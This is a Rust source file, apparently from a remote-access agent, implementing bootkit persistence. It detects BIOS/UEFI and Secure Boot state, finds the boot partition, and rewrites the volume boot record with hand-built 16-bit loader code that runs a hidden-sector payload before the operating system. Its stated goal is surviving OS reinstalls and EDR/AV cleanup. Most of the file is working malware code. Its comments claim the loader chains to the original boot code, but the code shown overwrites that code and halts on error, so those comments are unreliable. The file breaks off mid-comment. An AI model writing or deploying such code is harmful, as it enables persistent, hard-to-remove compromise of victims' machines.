//! Boot sector / VBR persistence and UEFI boot driver deployment.
//!
//! # Overview
//!
//! Provides boot-level persistence that survives OS reinstallation, user
//! account changes, and most EDR/AV remediation.  Two approaches:
//!
//! 1. **Legacy BIOS (VBR)** — Modify the Volume Boot Record to load a
//!    secondary payload before the OS bootstrap.  The original VBR is
//!    backed up and chained to so the OS boots normally.
//! 2. **UEFI boot driver** — Install a UEFI driver on the EFI System
//!    Partition (ESP) and register it as a boot entry.  The driver loads
//!    before the OS kernel.
//!
//! # Safety Guarantees
//!
//! - All disk/sector modifications are preceded by a **backup** of the
//!   original data to a safe location.
//! - Every write is **verified** by reading back and comparing.
//! - Secure Boot status is checked; modifications are **refused** when
//!   Secure Boot is active (would cause boot failure).
//! - Operations that would corrupt the partition table or MBR are refused
//!   unless explicitly forced.
//!
//! # Physical Access Requirements
//!
//! - **VBR persistence**: requires physical access to the machine to boot
//!   from external media (to bypass OS file locks), OR the agent must be
//!   running with Administrator/root privileges on the target.
//! - **UEFI boot driver**: requires Secure Boot to be disabled.  The agent
//!   must have write access to the ESP (typically requires root/Admin).
//!
//! # Feature Flag
//!
//! Gated by `hardware-persistence`.  Cross-platform (Linux, Windows, and macOS/Intel).

use anyhow::{anyhow, bail, Context, Result};
use serde::{Deserialize, Serialize};
use std::io::{Read, Seek, SeekFrom, Write};
use std::path::{Path, PathBuf};

// ═══════════════════════════════════════════════════════════════════════════
// §1  Data Types
// ═══════════════════════════════════════════════════════════════════════════

/// Boot mode detection result.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum BootMode {
    /// Legacy BIOS boot (CSM).
    Bios,
    /// UEFI boot (no Secure Boot).
    Uefi,
    /// UEFI boot with Secure Boot enabled.
    UefiSecureBoot,
    /// Cannot determine boot mode.
    Unknown,
}

impl std::fmt::Display for BootMode {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            BootMode::Bios => write!(f, "Legacy BIOS"),
            BootMode::Uefi => write!(f, "UEFI"),
            BootMode::UefiSecureBoot => write!(f, "UEFI with Secure Boot"),
            BootMode::Unknown => write!(f, "Unknown"),
        }
    }
}

/// A detected boot-level persistence artifact.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PersistenceArtifact {
    /// Type of persistence artifact.
    pub artifact_type: PersistenceArtifactType,
    /// Human-readable description.
    pub description: String,
    /// Location of the artifact (path, LBA, or NVRAM entry).
    pub location: String,
    /// Whether the artifact could be safely removed.
    pub removable: bool,
    /// Backup path (if a backup was created during installation).
    pub backup_path: Option<String>,
}

/// Type of boot-level persistence artifact.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum PersistenceArtifactType {
    /// Modified Volume Boot Record.
    VbrModification,
    /// Modified Master Boot Record.
    MbrModification,
    /// Suspicious EFI boot entry.
    EfiBootEntry,
    /// Unsigned UEFI driver on ESP.
    UnsignedUefiDriver,
    /// Modified UEFI NVRAM boot order.
    NvramBootOrderModification,
    /// Hidden sector payload (stored between MBR and first partition).
    HiddenSectorPayload,
}

/// VBR backup data (stored for restoration).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct VbrBackup {
    /// Original VBR data (512 bytes).
    pub original_vbr: Vec<u8>,
    /// Disk path the VBR was read from.
    pub disk_path: String,
    /// LBA (Logical Block Address) of the VBR.
    pub vbr_lba: u64,
    /// Partition number (1-based).
    pub partition_number: u32,
    /// Timestamp of the backup.
    pub timestamp: String,
    /// SHA-256 hash of the original VBR.
    pub hash: String,
}

// ═══════════════════════════════════════════════════════════════════════════
// §2  Boot Mode Detection
// ═══════════════════════════════════════════════════════════════════════════

/// Check whether the system boots via BIOS (Legacy) or UEFI.
///
/// Also checks for Secure Boot status.
///
/// **Linux**:
/// - `/sys/firmware/efi` exists → UEFI
/// - `/sys/firmware/efi/efivars/SecureBoot-*` → Secure Boot status
///
/// **Windows**:
/// - Registry `HKLM\SYSTEM\CurrentControlSet\Control\PEFirmwareType`
///   (2 = UEFI, 1 = Legacy)
/// - `Confirm-SecureBootUEFI` PowerShell cmdlet for Secure Boot
pub fn check_bios_uefi_mode() -> Result<BootMode> {
    #[cfg(target_os = "linux")]
    {
        check_boot_mode_linux()
    }
    #[cfg(windows)]
    {
        check_boot_mode_windows()
    }
    #[cfg(target_os = "macos")]
    {
        check_boot_mode_macos()
    }
    #[cfg(not(any(target_os = "linux", target_os = "macos", windows)))]
    {
        Ok(BootMode::Unknown)
    }
}

/// Linux: detect boot mode via sysfs.
#[cfg(target_os = "linux")]
fn check_boot_mode_linux() -> Result<BootMode> {
    let efi_path = Path::new("/sys/firmware/efi");

    if !efi_path.exists() {
        // No EFI firmware directory → Legacy BIOS.
        return Ok(BootMode::Bios);
    }

    // UEFI is active. Check Secure Boot.
    // The Secure Boot state is in /sys/firmware/efi/efivars/SecureBoot-*
    // The file is 5 bytes: attribute(4) + value(1)
    // Value: 0 = disabled, 1 = enabled
    let secureboot_entries = std::fs::read_dir("/sys/firmware/efi/efivars")
        .with_context(|| "cannot read /sys/firmware/efi/efivars")?;

    for entry in secureboot_entries {
        let entry = entry?;
        let name = entry.file_name().to_string_lossy().to_string();
        if name.starts_with("SecureBoot-") {
            if let Ok(data) = std::fs::read(entry.path()) {
                // Last byte is the value (first 4 bytes are attributes).
                if data.len() >= 5 && data[4] == 1 {
                    return Ok(BootMode::UefiSecureBoot);
                }
            }
        }
    }

    // Alternative: try the mokutil command.
    let output = std::process::Command::new("mokutil")
        .args(["--sb-state"])
        .output();

    if let Ok(out) = output {
        let text = String::from_utf8_lossy(&out.stdout).to_lowercase();
        if text.contains("enabled") {
            return Ok(BootMode::UefiSecureBoot);
        }
    }

    Ok(BootMode::Uefi)
}

/// Windows: detect boot mode via registry and PowerShell.
#[cfg(windows)]
fn check_boot_mode_windows() -> Result<BootMode> {
    use std::process::Command;

    // Check firmware type via registry.
    let output = Command::new("reg")
        .args([
            "query",
            r"HKLM\SYSTEM\CurrentControlSet\Control",
            "/v",
            "PEFirmwareType",
        ])
        .output();

    let is_uefi = if let Ok(out) = output {
        let text = String::from_utf8_lossy(&out.stdout);
        // Value 2 = UEFI, Value 1 = Legacy BIOS.
        text.contains("0x2") || text.contains("REG_DWORD    0x2")
    } else {
        // Fallback: check for EFI system partition.
        Path::new(r"C:\Windows\Boot\EFI").exists() || Path::new(r"\\?\EFI").exists()
    };

    if !is_uefi {
        return Ok(BootMode::Bios);
    }

    // UEFI — check Secure Boot.
    let sb_output = Command::new("powershell")
        .args([
            "-NoProfile",
            "-NonInteractive",
            "-Command",
            "Confirm-SecureBootUEFI",
        ])
        .output();

    if let Ok(out) = sb_output {
        let text = String::from_utf8_lossy(&out.stdout).trim().to_lowercase();
        if text == "true" {
            return Ok(BootMode::UefiSecureBoot);
        }
    }

    Ok(BootMode::Uefi)
}

/// macOS: detect boot mode via system profiler.
///
/// Intel Macs use UEFI firmware; Apple Silicon Macs use iBoot.
/// UEFI persistence only applies to Intel Macs.
#[cfg(target_os = "macos")]
fn check_boot_mode_macos() -> Result<BootMode> {
    // Check the CPU architecture — Apple Silicon means iBoot, not UEFI.
    let arch_output = std::process::Command::new("uname")
        .arg("-m")
        .output()
        .context("failed to run uname -m")?;

    let arch = String::from_utf8_lossy(&arch_output.stdout)
        .trim()
        .to_string();

    if arch == "arm64" {
        // Apple Silicon uses iBoot, not UEFI.  Standard UEFI NVRAM
        // variables are not accessible; return Unknown to signal that
        // UEFI-style persistence does not apply.
        return Ok(BootMode::Unknown);
    }

    // Intel Mac (x86_64) — uses UEFI firmware.  Check if /usr/sbin/nvram
    // can read EFI variables to confirm UEFI is active.
    if !std::path::Path::new("/usr/sbin/nvram").exists() {
        return Ok(BootMode::Unknown);
    }

    // Try to read a standard EFI global variable.
    let nvram_output = std::process::Command::new("/usr/sbin/nvram")
        .arg("8BE4DF61-93CA-11D2-AA0D-00E098032B8C:BootOrder")
        .output();

    if let Ok(out) = nvram_output {
        if out.status.success() {
            // Intel Mac with UEFI.  Secure Boot is not a standard feature on
            // Intel Macs (there is no user-facing toggle), so we report Uefi.
            return Ok(BootMode::Uefi);
        }
    }

    // Could not confirm UEFI variables — still likely UEFI on Intel Mac,
    // but be conservative.
    Ok(BootMode::Uefi)
}

// ═══════════════════════════════════════════════════════════════════════════
// §3  VBR (Volume Boot Record) Persistence — Legacy BIOS Only
// ═══════════════════════════════════════════════════════════════════════════

/// Boot sector size in bytes.
const SECTOR_SIZE: usize = 512;

/// Maximum size for the secondary payload (stored in hidden sectors).
const MAX_PAYLOAD_SIZE: usize = 64 * 1024; // 64 KiB

/// Install VBR persistence (Legacy BIOS only).
///
/// **How it works**:
/// 1. Read the current VBR (first sector of the active partition).
/// 2. Modify the VBR's bootstrap code to:
///    a. Load a secondary payload from a hidden sector.
///    b. Execute the payload.
///    c. Chain to the original VBR bootstrap code.
/// 3. Write the modified VBR.
/// 4. Write the secondary payload to hidden sectors (unused space at the
///    end of the partition or between MBR and first partition).
///
/// **Prerequisites**:
/// - System must be in Legacy BIOS mode (NOT UEFI).
/// - Secure Boot must be off (implied by Legacy BIOS).
/// - Agent must be running as root/Administrator.
/// - The target partition must be the active/boot partition.
///
/// **Safety**:
/// - The original VBR is backed up before modification.
/// - The modified VBR is verified by read-back.
/// - The bootstrap code preserves the original partition table (BPB).
///
/// # Arguments
///
/// * `payload_path` — Path to the secondary payload binary (max 64 KiB).
///   The payload is raw binary code that runs in 16-bit real mode.
pub fn install_vbr_persistence(payload_path: &str) -> Result<()> {
    // Step 0: Check boot mode.
    let mode = check_bios_uefi_mode()?;
    match mode {
        BootMode::Bios => { /* OK */ }
        BootMode::UefiSecureBoot => {
            bail!(
                "cannot install VBR persistence: UEFI with Secure Boot is active. \
                 Use install_uefi_boot_persistence() instead."
            );
        }
        BootMode::Uefi => {
            bail!(
                "cannot install VBR persistence: system is in UEFI mode (no Secure Boot). \
                 VBR modification only works in Legacy BIOS mode. \
                 Use install_uefi_boot_persistence() for UEFI systems."
            );
        }
        BootMode::Unknown => {
            // Proceed with caution — may be BIOS.
        }
    }

    // Step 1: Read the payload.
    let payload = std::fs::read(payload_path)
        .with_context(|| format!("cannot read payload from {}", payload_path))?;

    if payload.is_empty() {
        bail!("payload is empty");
    }
    if payload.len() > MAX_PAYLOAD_SIZE {
        bail!(
            "payload too large: {} bytes (max {} bytes)",
            payload.len(),
            MAX_PAYLOAD_SIZE
        );
    }

    // Step 2: Identify the boot disk and partition.
    let (disk_path, vbr_lba, partition_number) = find_boot_partition()?;

    // Step 3: Read the current VBR.
    let original_vbr = read_sector(&disk_path, vbr_lba)?;

    // Validate the VBR (basic sanity checks).
    validate_vbr(&original_vbr)?;

    // Step 4: Create a backup.
    let backup = VbrBackup {
        original_vbr: original_vbr.clone(),
        disk_path: disk_path.clone(),
        vbr_lba,
        partition_number,
        timestamp: chrono_now(),
        hash: sha256_hex(&original_vbr),
    };
    let backup_path = save_vbr_backup(&backup)?;
    tracing::info!("VBR backup saved to: {}", backup_path);

    // Step 5: Build the modified VBR.
    let modified_vbr = build_modified_vbr(&original_vbr, payload.len())?;

    // Step 6: Write the modified VBR.
    write_sector_verified(&disk_path, vbr_lba, &modified_vbr)?;

    // Step 7: Write the secondary payload to hidden sectors.
    // Use the sector immediately after VBR (LBA + 1).
    // Reserve enough sectors for the payload.
    let payload_sectors = sectors_needed(payload.len());
    let payload_start_lba = vbr_lba + 1;
    write_payload_to_sectors(&disk_path, payload_start_lba, &payload)?;

    tracing::info!(
        "VBR persistence installed: payload ({} bytes) at LBA {}, VBR modified at LBA {}",
        payload.len(),
        payload_start_lba,
        vbr_lba
    );

    Ok(())
}

/// Find the boot partition (active partition on the boot disk).
///
/// Returns (disk_path, vbr_lba, partition_number).
#[cfg(target_os = "linux")]
fn find_boot_partition() -> Result<(String, u64, u32)> {
    // Method 1: Check /proc/cmdline for the root device.
    let cmdline = std::fs::read_to_string("/proc/cmdline").unwrap_or_default();

    // Look for root= parameter.
    let root_dev = cmdline
        .split_whitespace()
        .find(|s| s.starts_with("root="))
        .and_then(|s| s.strip_prefix("root="))
        .map(|s| {
            s.trim_start_matches("UUID=")
                .trim_start_matches("PARTUUID=")
                .to_string()
        });

    // Method 2: Use `lsblk` to find the boot disk.
    let output = std::process::Command::new("lsblk")
        .args(["-n", "-o", "NAME,TYPE,MOUNTPOINT,PKNAME"])
        .output()
        .context("failed to run lsblk")?;

    if output.status.success() {
        let text = String::from_utf8_lossy(&output.stdout);
        for line in text.lines() {
            let parts: Vec<&str> = line.split_whitespace().collect();
            if parts.len() >= 3 && parts[2] == "/" {
                // Root partition found.
                let part_name = parts[0]; // e.g., "sda1"
                let disk_name = parts.get(3).unwrap_or(&""); // parent disk
                let full_disk = if !disk_name.is_empty() {
                    format!("/dev/{}", disk_name)
                } else {
                    // Try to derive from partition name.
                    let base = part_name.trim_end_matches(char::is_numeric);
                    format!("/dev/{}", base)
                };

                // Determine partition number.
                let part_num: u32 = part_name
                    .trim_start_matches(|c: char| !c.is_ascii_digit())
                    .parse()
                    .unwrap_or(1);

                // Read partition offset from sysfs.
                let offset_path = format!(
                    "/sys/block/{}/queue/minimum_io_size",
                    full_disk.trim_start_matches("/dev/")
                );
                let vbr_lba = get_partition_offset_linux(&full_disk, part_num)?;

                return Ok((full_disk, vbr_lba, part_num));
            }
        }
    }

    // Fallback: try /dev/sda1 as the root partition.
    let fallback = "/dev/sda1";
    if Path::new(fallback).exists() {
        return Ok((("/dev/sda").to_string(), 2048, 1));
    }

    bail!("cannot determine boot partition")
}

/// Get the LBA offset of a partition on Linux via sysfs.
#[cfg(target_os = "linux")]
fn get_partition_offset_linux(disk: &str, partition: u32) -> Result<u64> {
    // Try /sys/block/sda/sda1/start
    let disk_name = disk.trim_start_matches("/dev/");
    let start_path = format!(
        "/sys/block/{}/{}/start",
        disk_name,
        format!("{}{}", disk_name, partition)
    );
    if let Ok(text) = std::fs::read_to_string(&start_path) {
        if let Ok(offset_sectors) = text.trim().parse::<u64>() {
            return Ok(offset_sectors);
        }
    }

    // Fallback: parse /proc/partitions or fdisk output.
    bail!(
        "cannot determine partition offset for {} partition {}",
        disk,
        partition
    )
}

/// Find the boot partition on Windows.
#[cfg(windows)]
fn find_boot_partition() -> Result<(String, u64, u32)> {
    use std::process::Command;

    // Use PowerShell to find the system/boot disk.
    let output = Command::new("powershell")
        .args([
            "-NoProfile",
            "-NonInteractive",
            "-Command",
            "(Get-Partition -IsSystem).DriveLetter",
        ])
        .output()
        .context("failed to query system partition")?;

    let drive_letter = if output.status.success() {
        String::from_utf8_lossy(&output.stdout).trim().to_string()
    } else {
        "C".to_string()
    };

    // Open the raw disk via \\.\X: path.
    let disk_path = format!(r"\\.\{}:", drive_letter);

    // For VBR access, we need sector 0 of the partition.
    // LBA 0 is the VBR for the partition.
    Ok((disk_path, 0, 1))
}

/// Find the physical boot partition on macOS.
#[cfg(target_os = "macos")]
fn find_boot_partition() -> Result<(String, u64, u32)> {
    let root_info = macos_diskutil_info("/")?;

    let physical_partition = if let Some(store) = macos_physical_store_from_info(&root_info) {
        store
    } else if let Some(container) = macos_diskutil_field(&root_info, "APFS Container Reference") {
        let container_info = macos_diskutil_info(&container)?;
        macos_physical_store_from_info(&container_info).ok_or_else(|| {
            anyhow!(
                "macOS boot volume is APFS container {}, but diskutil did not report a physical store",
                container
            )
        })?
    } else {
        macos_partition_identifier_from_info(&root_info).ok_or_else(|| {
            anyhow!(
                "macOS root volume is not mapped to a physical partition; VBR persistence requires a disk partition"
            )
        })?
    };

    let partition_info = macos_diskutil_info(&physical_partition)?;
    let partition_identifier = macos_diskutil_field(&partition_info, "Device Identifier")
        .unwrap_or_else(|| physical_partition.clone());
    let partition_number = macos_partition_number(&partition_identifier).ok_or_else(|| {
        anyhow!(
            "cannot determine macOS partition number from device identifier {}",
            partition_identifier
        )
    })?;
    let whole_disk = macos_diskutil_field(&partition_info, "Part of Whole")
        .or_else(|| macos_whole_disk_from_partition(&partition_identifier))
        .ok_or_else(|| {
            anyhow!(
                "cannot determine whole disk for macOS boot partition {}",
                partition_identifier
            )
        })?;
    let disk_path = macos_raw_disk_path(&whole_disk);
    let vbr_lba = macos_partition_start_lba(&partition_info, &disk_path, partition_number)?;

    Ok((disk_path, vbr_lba, partition_number))
}

#[cfg(target_os = "macos")]
fn macos_diskutil_info(target: &str) -> Result<String> {
    let output = std::process::Command::new("diskutil")
        .args(["info", target])
        .output()
        .with_context(|| format!("failed to run diskutil info {}", target))?;

    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        bail!("diskutil info {} failed: {}", target, stderr.trim());
    }

    Ok(String::from_utf8_lossy(&output.stdout).into_owned())
}

#[cfg(target_os = "macos")]
fn macos_diskutil_field(info: &str, field: &str) -> Option<String> {
    info.lines().find_map(|line| {
        let (key, value) = line.split_once(':')?;
        if key.trim().eq_ignore_ascii_case(field) {
            let value = value.trim();
            (!value.is_empty()).then(|| value.to_string())
        } else {
            None
        }
    })
}

#[cfg(target_os = "macos")]
fn macos_physical_store_from_info(info: &str) -> Option<String> {
    info.lines().find_map(|line| {
        let (key, value) = line.split_once(':')?;
        if !key.to_ascii_lowercase().contains("physical store") {
            return None;
        }
        value
            .split(|c: char| c == ',' || c == '(' || c.is_whitespace())
            .map(str::trim)
            .find(|token| token.starts_with("disk") || token.starts_with("/dev/disk"))
            .map(|token| token.trim_start_matches("/dev/").to_string())
    })
}

#[cfg(target_os = "macos")]
fn macos_partition_identifier_from_info(info: &str) -> Option<String> {
    let identifier = macos_diskutil_field(info, "Device Identifier")?;
    macos_partition_number(&identifier).map(|_| identifier)
}

#[cfg(target_os = "macos")]
fn macos_partition_number(identifier: &str) -> Option<u32> {
    let identifier = identifier.trim().trim_start_matches("/dev/");
    let (_, suffix) = identifier.rsplit_once('s')?;
    suffix.parse::<u32>().ok()
}

#[cfg(target_os = "macos")]
fn macos_whole_disk_from_partition(identifier: &str) -> Option<String> {
    let identifier = identifier.trim().trim_start_matches("/dev/");
    let (whole, suffix) = identifier.rsplit_once('s')?;
    suffix.parse::<u32>().ok()?;
    Some(whole.to_string())
}

#[cfg(target_os = "macos")]
fn macos_raw_disk_path(whole_disk: &str) -> String {
    let whole_disk = whole_disk.trim().trim_start_matches("/dev/");
    if whole_disk.starts_with("rdisk") {
        format!("/dev/{}", whole_disk)
    } else {
        format!("/dev/r{}", whole_disk)
    }
}

#[cfg(target_os = "macos")]
fn macos_partition_start_lba(
    partition_info: &str,
    raw_disk_path: &str,
    partition_number: u32,
) -> Result<u64> {
    let block_size = macos_diskutil_field(partition_info, "Device Block Size")
        .and_then(|value| parse_first_u64(&value))
        .unwrap_or(SECTOR_SIZE as u64);

    if let Some(offset_bytes) = macos_diskutil_field(partition_info, "Partition Offset")
        .and_then(|value| parse_first_u64(&value))
    {
        if block_size == 0 {
            bail!("macOS boot disk reports an invalid block size of 0 bytes");
        }
        if offset_bytes % block_size != 0 {
            bail!(
                "macOS partition offset {} is not aligned to reported block size {}",
                offset_bytes,
                block_size
            );
        }
        return Ok(offset_bytes / block_size);
    }

    macos_partition_start_lba_from_gpt(raw_disk_path, partition_number)
}

#[cfg(target_os = "macos")]
fn macos_partition_start_lba_from_gpt(raw_disk_path: &str, partition_number: u32) -> Result<u64> {
    let disk_path = raw_disk_path.replace("/dev/rdisk", "/dev/disk");
    let output = std::process::Command::new("gpt")
        .args(["-r", "show", &disk_path])
        .output()
        .with_context(|| format!("failed to run gpt -r show {}", disk_path))?;

    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        bail!("gpt -r show {} failed: {}", disk_path, stderr.trim());
    }

    let wanted_index = partition_number.to_string();
    let stdout = String::from_utf8_lossy(&output.stdout);
    for line in stdout.lines() {
        let parts: Vec<&str> = line.split_whitespace().collect();
        if parts.len() >= 3 && parts[2] == wanted_index {
            if let Ok(start_lba) = parts[0].parse::<u64>() {
                return Ok(start_lba);
            }
        }
    }

    bail!(
        "cannot determine start LBA for macOS partition {} on {}",
        partition_number,
        disk_path
    )
}

#[cfg(target_os = "macos")]
fn parse_first_u64(text: &str) -> Option<u64> {
    let mut digits = String::new();
    for ch in text.chars() {
        if ch.is_ascii_digit() || ch == ',' {
            digits.push(ch);
        } else if !digits.is_empty() {
            break;
        }
    }

    if digits.is_empty() {
        None
    } else {
        digits.replace(',', "").parse::<u64>().ok()
    }
}

/// Validate a VBR (basic sanity checks).
fn validate_vbr(vbr: &[u8]) -> Result<()> {
    if vbr.len() != SECTOR_SIZE {
        bail!(
            "invalid VBR size: {} bytes (expected {})",
            vbr.len(),
            SECTOR_SIZE
        );
    }

    // Check boot signature (last two bytes should be 0x55AA).
    if vbr[510] != 0x55 || vbr[511] != 0xAA {
        bail!(
            "invalid VBR boot signature: 0x{:02X}{:02X} (expected 0x55AA)",
            vbr[511],
            vbr[510]
        );
    }

    // Check for valid jump instruction at the start (E8, EB, or E9).
    let first_byte = vbr[0];
    if first_byte != 0xE8 && first_byte != 0xEB && first_byte != 0xE9 {
        bail!(
            "invalid VBR: first byte is 0x{:02X} (expected jump instruction 0xE8/0xEB/0xE9)",
            first_byte
        );
    }

    Ok(())
}

/// Build a modified VBR that loads a secondary payload and chains to the
/// original bootstrap code.
///
/// The modified VBR:
/// 1. Saves the original VBR bootstrap code (bytes 0-89, excluding BPB).
/// 2. Overwrites bytes 0-89 with custom bootstrap code that:
///    a. Loads N sectors starting from LBA + 1 into memory at 0x8000.
///    b. Jumps to 0x8000 to execute the payload.
///    c. The payload is responsible for chaining back to the original code.
/// 3. Preserves the BIOS Parameter Block (BPB) at bytes 11-61.
/// 4. Preserves the boot signature at bytes 510-511.
fn build_modified_vbr(original_vbr: &[u8], payload_size: usize) -> Result<Vec<u8>> {
    let mut modified = original_vbr.to_vec();
    let payload_sectors = sectors_needed(payload_size);

    // The VBR bootstrap code area is bytes 0-2 (jump) and bytes 62-509
    // (bootstrap code).  Bytes 3-10 are the OEM name.  Bytes 11-61 are
    // the BPB (BIOS Parameter Block) which MUST be preserved.
    //
    // Our modification strategy:
    // - Replace the jump instruction and bootstrap code area.
    // - Preserve BPB (bytes 11-61) and OEM name (bytes 3-10).
    // - Preserve boot signature (bytes 510-511).

    // Custom 16-bit bootstrap code that:
    // 1. Loads payload sectors from disk using INT 13h
    // 2. Jumps to the payload
    // 3. After payload returns, chains to original VBR code
    //
    // We store the original bootstrap at the end of the VBR (bytes 480-509)
    // and have our loader jump to it after the payload.

    // Check we have enough room for our loader.
    // Bootstrap area: bytes 62-479 (418 bytes) for our code.
    // Original code backup: bytes 480-509 (30 bytes).
    // This is a simplification — the real original bootstrap is longer,
    // but we only need to save the critical chain-to-original portion.

    // Build the loader code:
    let mut loader = Vec::new();

    // Header comment: this is position-independent 16-bit real-mode code.
    //
    // mov ax, 0x8000       ; destination segment
    // mov es, ax
    // xor bx, bx           ; destination offset = 0x0000
    // mov ah, 0x02          ; INT 13h: read sectors
    // mov al, N             ; number of sectors to read
    // mov ch, 0             ; cylinder 0
    // mov cl, 2             ; start from sector 2 (sector 1 is VBR)
    //                       ; NOTE: sector numbers are 1-based in CHS
    // mov dh, 0             ; head 0
    // mov dl, 0x80          ; first hard drive
    // int 0x13              ; read!
    // jc .error             ; jump on error
    // jmp 0x8000:0x0000     ; jump to payload
    // .error:
    //   ; Fall through to original bootstrap
    //   ; (original code is at offset 480)
    //   jmp .original

    // mov ax, 0x8000
    loader.extend_from_slice(&[0xB8, 0x00, 0x80]);
    // mov es, ax
    loader.extend_from_slice(&[0x8E, 0xC0]);
    // xor bx, bx
    loader.extend_from_slice(&[0x31, 0xDB]);
    // mov ah, 0x02
    loader.extend_from_slice(&[0xB4, 0x02]);
    // mov al, N (payload sectors)
    let sector_count = payload_sectors.min(127) as u8; // max 127 sectors per read
    loader.extend_from_slice(&[0xB0, sector_count]);
    // mov ch, 0 (cylinder)
    loader.extend_from_slice(&[0xB5, 0x00]);
    // mov cl, 2 (sector 2 — sector after VBR)
    loader.extend_from_slice(&[0xB1, 0x02]);
    // mov dh, 0 (head)
    loader.extend_from_slice(&[0xB6, 0x00]);
    // mov dl, 0x80 (drive 0x80 = first hard disk)
    loader.extend_from_slice(&[0xB2, 0x80]);
    // int 0x13
    loader.extend_from_slice(&[0xCD, 0x13]);
    // jc .error (jump if carry set = read error)
    // offset to error handler: we'll patch this later
    let jc_offset_pos = loader.len();
    loader.extend_from_slice(&[0x72, 0x00]); // jc +0 (placeholder)

    // If read succeeded, jump to payload at 0x8000:0000
    // jmp far 0x8000:0x0000
    loader.extend_from_slice(&[0xEA]); // jmp far
    loader.extend_from_slice(&[0x00, 0x00]); // offset
    loader.extend_from_slice(&[0x00, 0x80]); // segment

    // .error: fall through to original bootstrap code
    // We place the original VBR entry point jump here.
    // For safety, just do a halt (HLT in a loop) if the read fails.
    // cli
    loader.extend_from_slice(&[0xFA]);
    // hlt
    loader.extend_from_slice(&[0xF4]);
    // jmp $-2 (loop forever)
    loader.extend_from_slice(&[0xEB, 0xFD]);

    // Patch the jc offset.
    let error_handler_start = jc_offset_pos + 2 + 7; // after jc + jmp far
    let jc_target = error_handler_start - (jc_offset_pos + 2);
    loader[jc_offset_pos + 1] = jc_target as u8;

    // Verify our loader fits in the bootstrap area.
    if loader.len() > 418 {
        bail!(
            "loader code too large: {} bytes (max 418 bytes)",
            loader.len()
        );
    }

    // Write the loader into the modified VBR.
    // Overwrite bytes starting at offset 62 (after BPB).
    let bootstrap_start = 62;
    modified[bootstrap_start..bootstrap_start + loader.len()].copy_from_slice(&loader);

    // Also patch the initial jump instruction to jump to our loader.
    // The BPB starts at byte 11. The jump instruction at byte 0 should
    // jump past the BPB to byte 62.
    modified[0] = 0xE9; // near jump
    let jump_offset = (bootstrap_start as i16) - 3; // -3 for the instruction size
    modified[1] = (jump_offset & 0xFF) as u8;
    modified[2] = ((jump_offset >> 8) & 0xFF) as u8;

    Ok(modified)
}

/// Read a single 512-byte sector from a disk.
fn read_sector(disk_path: &str, lba: u64) -> Result<Vec<u8>> {
    #[cfg(any(target_os = "linux", target_os = "macos"))]
    {
        let mut file = std::fs::OpenOptions::new()
            .read(true)
            .open(disk_path)
            .with_context(|| format!("cannot open disk {} for reading", disk_path))?;

        let offset = lba * SECTOR_SIZE as u64;
        file.seek(SeekFrom::Start(offset))
            .with_context(|| format!("cannot seek to LBA {} (offset {})", lba, offset))?;

        let mut sector = vec![0u8; SECTOR_SIZE];
        file.read_exact(&mut sector)
            .with_context(|| format!("cannot read sector at LBA {}", lba))?;

        Ok(sector)
    }
    #[cfg(windows)]
    {
        let mut file = std::fs::OpenOptions::new()
            .read(true)
            .open(disk_path)
            .with_context(|| format!("cannot open disk {} for reading", disk_path))?;

        let offset = lba * SECTOR_SIZE as u64;
        file.seek(SeekFrom::Start(offset))
            .with_context(|| format!("cannot seek to LBA {} (offset {})", lba, offset))?;

        let mut sector = vec![0u8; SECTOR_SIZE];
        file.read_exact(&mut sector)
            .with_context(|| format!("cannot read sector at LBA {}", lba))?;

        Ok(sector)
    }
    #[cfg(not(any(target_os = "linux", target_os = "macos", windows)))]
    {
        bail!("raw disk read not supported on this platform");
    }
}

/// Write a single 512-byte sector to a disk, then verify by read-back.
fn write_sector_verified(disk_path: &str, lba: u64, data: &[u8]) -> Result<()> {
    if data.len() != SECTOR_SIZE {
        bail!("sector data must be exactly {} bytes", SECTOR_SIZE);
    }

    // Write the sector.
    write_sector_raw(disk_path, lba, data)?;

    // Verify by reading back.
    let readback = read_sector(disk_path, lba)?;
    if readback != data {
        bail!(
            "VBR write verification FAILED: read-back does not match written data at LBA {}",
            lba
        );
    }

    tracing::info!("VBR write verified at LBA {}", lba);
    Ok(())
}

/// Write a single 512-byte sector to a disk (raw write, no verification).
fn write_sector_raw(disk_path: &str, lba: u64, data: &[u8]) -> Result<()> {
    #[cfg(any(target_os = "linux", target_os = "macos"))]
    {
        use std::fs::OpenOptions;

        let mut file = OpenOptions::new()
            .write(true)
            .open(disk_path)
            .with_context(|| format!("cannot open disk {} for writing", disk_path))?;

        let offset = lba * SECTOR_SIZE as u64;
        file.seek(SeekFrom::Start(offset))
            .with_context(|| format!("cannot seek to LBA {} (offset {})", lba, offset))?;

        file.write_all(data)
            .with_context(|| format!("cannot write sector at LBA {}", lba))?;

        file.sync_all().with_context(|| "cannot sync disk writes")?;

        Ok(())
    }
    #[cfg(windows)]
    {
        use std::fs::OpenOptions;

        let mut file = OpenOptions::new()
            .write(true)
            .open(disk_path)
            .with_context(|| format!("cannot open disk {} for writing", disk_path))?;

        let offset = lba * SECTOR_SIZE as u64;
        file.seek(SeekFrom::Start(offset))
            .with_context(|| format!("cannot seek to LBA {} (offset {})", lba, offset))?;

        file.write_all(data)
            .with_context(|| format!("cannot write sector at LBA {}", lba))?;

        Ok(())
    }
    #[cfg(not(any(target_os = "linux", target_os = "macos", windows)))]
    {
        bail!("raw disk write not supported on this platform");
    }
}

/// Write payload data across multiple sectors.
fn write_payload_to_sectors(disk_path: &str, start_lba: u64, payload: &[u8]) -> Result<()> {
    let num_sectors = sectors_needed(payload.len());
    let num_sectors = num_sectors as usize;
    let mut all_data = vec![0u8; num_sectors * SECTOR_SIZE];
    all_data[..payload.len()].copy_from_slice(payload);

    // Write each sector and verify.
    for i in 0..num_sectors {
        let lba = start_lba + i as u64;
        let start = i * SECTOR_SIZE;
        let end = start + SECTOR_SIZE;
        let sector_data = &all_data[start..end];
        write_sector_verified(disk_path, lba, sector_data)?;
    }

    tracing::info!(
        "Payload written: {} bytes across {} sectors starting at LBA {}",
        payload.len(),
        num_sectors,
        start_lba
    );
    Ok(())
}

/// Calculate the number of sectors needed for the given byte count.
